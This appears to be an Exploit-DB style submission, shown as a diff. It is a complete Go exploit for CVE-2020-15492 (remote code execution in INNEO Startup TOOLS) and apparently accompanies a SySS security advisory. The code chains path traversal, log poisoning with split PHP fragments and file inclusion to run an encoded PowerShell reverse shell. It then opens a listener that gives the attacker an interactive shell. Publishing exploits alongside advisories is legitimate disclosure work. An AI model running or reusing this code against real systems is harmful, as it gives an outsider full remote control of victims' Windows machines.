@@ -1,0 +1,281 @@
+# Exploit Title: INNEO Startup TOOLS 2018 M040 13.0.70.3804 - Remote Code Execution
+# Date: 2020-07-23
+# Exploit Author: Patrick Hener, SySS GmbH
+# Many credits go to Dr. Benjamin Heß, SySS GmbH for helping with php oddities and the powershell payload
+# Advisory: SYSS-2020-028 (https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-028.txt)
+# Vendor Homepage: https://www.inneo.co.uk/en/home.html
+# Version: Startup TOOLS 2017/2018
+# Tested on: Windows 10 x64
+# CVE : CVE-2020-15492
+
+/* This exploit was written by Patrick Hener, SySS GmbH
+*/
+
+package main
+
+import (
+	"encoding/base64"
+	"fmt"
+	_ "fmt"
+	"io"
+	"io/ioutil"
+	"log"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"regexp"
+	"strconv"
+	"strings"
+
+	"golang.org/x/text/encoding/unicode"
+)
+
+type progress struct {
+	bytes uint64
+}
+
+func usage() {
+	fmt.Printf("Usage: %s lhost[192.168.x.x] lport[4444] url[http://ip:85] installDir[PROGRA~2/stools] \n\n", os.Args[0])
+	os.Exit(2)
+}
+
+func readFile(target string, traversal string, path string) (bool, string) {
+	success := true
+	request := fmt.Sprintf("%s%s%s", target, traversal, path)
+	resp, err := http.Get(request)
+	if err != nil {
+		fmt.Println(err)
+	}
+	if resp.Status != "200 OK" {
+		success = false
+	}
+
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	return success, string(body)
+}
+
+func triggerFile(target string, traversal string, path string) {
+	request := fmt.Sprintf("%s%s%s", target, traversal, path)
+	_, _ = http.Get(request)
+}
+
+func poison(target string, traversal string, path string) (bool, string) {
+	success := true
+	request := fmt.Sprintf("%s%s%s", target, traversal, path)
+	resp, err := http.Get(request)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(2)
+	}
+	if resp.Status != "404 Not Found" {
+		success = false
+	}
+
+	defer resp.Body.Close()
+
+	fmt.Printf("[*] Poisoned: %s\n", path)
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	return success, string(body)
+}
+
+func parseHostname(body string) string {
+	re := regexp.MustCompile("Service hostname:?.*")
+	hostnameRaw := re.FindAllString(body, -1)
+	hostnameSplit := strings.Split(hostnameRaw[0], ":")
+	hostnameTrimmed := strings.TrimSpace(hostnameSplit[1])
+	hostnameNoNewline := strings.Replace(hostnameTrimmed, "\n", "", -1)
+
+	return hostnameNoNewline
+}
+
+func customEscape(sequence string) string {
+	output := url.PathEscape(sequence)
+	output = strings.Replace(output, "+", "%20", -1)
+	output = strings.Replace(output, "=", "%3D", -1)
+
+	return output
+}
+
+func payloadEscape(sequence string) string {
+	output := url.PathEscape(sequence)
+	output = strings.Replace(output, "=", "%3D", -1)
+
+	return output
+}
+
+func transferStreams(con net.Conn) {
+	c := make(chan progress)
+
+	// Read from Reader and write to Writer until EOF
+	copy := func(r io.ReadCloser, w io.WriteCloser) {
+		defer func() {
+			r.Close()
+			w.Close()
+		}()
+		n, err := io.Copy(w, r)
+		if err != nil {
+			fmt.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
+		}
+		c <- progress{bytes: uint64(n)}
+	}
+
+	go copy(con, os.Stdout)
+	go copy(os.Stdin, con)
+
+	p := <-c
+	fmt.Printf("[*] [%s]: Connection has been closed by remote peer, %d bytes has been received\n", con.RemoteAddr(), p.bytes)
+	p = <-c
+	fmt.Printf("[*] [%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
+}
+
+func startServer(addr string) {
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	fmt.Printf("[+] Now listening on %s\n", addr)
+	con, err := ln.Accept()
+	if err != nil {
+		log.Fatalln(err)
+	}
+	fmt.Printf("[+] [%s]: Connection has been opened. Press 'RETURN' once to start. Enjoy your shell, good sir.\n", con.RemoteAddr())
+	transferStreams(con)
+}
+
+func stage1(target string, traversal string, installDir string) string {
+	fmt.Printf("[*] Attacking target %s with assumed install path %s\n", target, installDir)
+	fmt.Printf("[*] Trying to read 'sut_server.log' to receive hostname of target at %s%s%s/software/LOG/sut_server.log\n", target, traversal, installDir)
+	path := fmt.Sprintf("%s/software/LOG/sut_server.log", installDir)
+	success, response := readFile(target, traversal, path)
+	if !success {
+		fmt.Printf("[-] It looks like %s%s%s is not there. Provide install_dir to try via args.\n", target, traversal, installDir)
+		os.Exit(2)
+	}
+	hostname := parseHostname(response)
+
+	return hostname
+}
+
+func stage2(target string, traversal string, installDir string, payloadFinal string) {
+	/* Stage 2 - poison log with php payload
+	    Special about that is the length of payload junk has max restriction of about 200 characters
+	    Thus we are splitting up the payload escaping the trash we don't need like
+	    the 'n' is nesessary to escape DRIVE:\ which will be DRIVE:\n then
+	    <?php $cmd=''; $foo= '
+	    n'; $cmd.="part1"; $foo='
+	    n'; $cmd.="part2"; $foo='
+	     ....
+		n'; system(cmd); ?>
+	*/
+	fmt.Println("[*] Poisoning Log with payload")
+	/* Start of the php code */
+	start := customEscape("<?php $cmd=''; $foo='")
+	success, _ := poison(target, traversal, start)
+	if !success {
+		fmt.Println("Poisoning failed. Exiting")
+		os.Exit(2)
+	}
+
+	/* Looping through payload */
+	offset := 0
+	pre := "n'; $cmd.='"
+	post := "'; $foo='"
+
+	for offset < len(payloadFinal) {
+		payload := payloadFinal[offset : offset+150-len(pre)-len(post)]
+		poisonPath := payloadEscape(fmt.Sprintf("%s%s%s", pre, payload, post))
+		success, _ = poison(target, traversal, poisonPath)
+		if !success {
+			fmt.Println("Poisoning failed. Exiting")
+			os.Exit(2)
+		}
+		offset += 150 - len(pre) - len(post)
+
+		if len(payloadFinal)-offset <= 150-len(pre)-len(post) {
+			break
+		}
+	}
+
+	/* Send last slice of payload to prevent from out of range error */
+	payload := payloadFinal[offset:len(payloadFinal)]
+	poisonPath := payloadEscape(fmt.Sprintf("%s%s%s", pre, payload, post))
+	success, _ = poison(target, traversal, poisonPath)
+	if !success {
+		fmt.Println("Poisoning failed. Exiting")
+		os.Exit(2)
+	}
+
+	/* End of the php code */
+	end := customEscape("n'; system($cmd); die; ?>")
+	success, _ = poison(target, traversal, end)
+	if !success {
+		fmt.Println("Poisoning failed. Exiting")
+		os.Exit(2)
+	}
+}
+
+func stage3(target string, traversal string, installDir string, hostname string) {
+	logFile := fmt.Sprintf("%s%s%s/software/LOG/sut_server_%s.log\\0.php", target, traversal, installDir, hostname)
+	fmt.Printf("[*] Triggering inclusion of %s\n", logFile)
+	triggerFile(target, traversal, logFile)
+}
+
+func stage4(lhost string, lport int) {
+	/* Listen for socket connection */
+	addr := fmt.Sprintf("%s:%d", lhost, lport)
+	fmt.Printf("[*] Starting reverse listener at %s\n", addr)
+	startServer(addr)
+}
+
+func main() {
+	if len(os.Args) < 4 {
+		usage()
+	}
+
+	lhost := os.Args[1]
+	lport, err := strconv.Atoi(os.Args[2])
+	if err != nil {
+		fmt.Println("lport has to be numeric")
+		os.Exit(2)
+	}
+	target := os.Args[3]
+	var installDir string
+	if len(os.Args) == 4 {
+		installDir = "PROGRA~2/stools"
+	} else {
+		installDir = os.Args[4]
+	}
+
+	/* Payload definition */
+	payload := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", lhost, lport)
+	/* Convert to base64 UTF-16LE */
+	encoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder()
+	payloadEncoded, _ := encoder.String(payload)
+	payloadEncodedString := base64.StdEncoding.EncodeToString([]byte(payloadEncoded))
+	/* In webshell we would issue: powershell.exe -exec bypass -EncodedCommand <encoded_payload> */
+	payloadFinal := fmt.Sprintf("powershell.exe -exec bypass -EncodedCommand %s", payloadEncodedString)
+
+	/* Traversal to root - default depth would be 4 */
+	traversal := "/../../../../../../../../../../"
+
+	/* stage 1  - get hostname */
+	hostname := stage1(target, traversal, installDir)
+	fmt.Printf("[+] Hostname of target is: %s\n", hostname)
+	/* stage 2 - poisoning */
+	stage2(target, traversal, installDir, payloadFinal)
+	/* stage 3 - trigger */
+	go stage3(target, traversal, installDir, hostname)
+	/* stage4 - start listener */
+	stage4(lhost, lport)
+}
